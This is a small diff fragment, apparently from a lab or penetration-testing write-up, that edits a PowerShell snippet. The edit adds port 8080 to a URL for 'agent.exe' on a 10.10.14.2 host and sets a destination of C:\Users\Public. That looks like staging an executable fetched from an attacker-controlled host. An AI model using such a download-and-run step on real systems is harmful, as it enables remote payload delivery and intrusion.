@@ -54,7 +54,7 @@ Add-Type $MyBusinessLogic
 
 ```powershell
 # Define variables
-$url = "http://10.10.14.2/agent.exe"
+$url = "http://10.10.14.2:8080/agent.exe"
 $exeName = "agent.exe"
 $destPath = "C:\Users\Public"
 
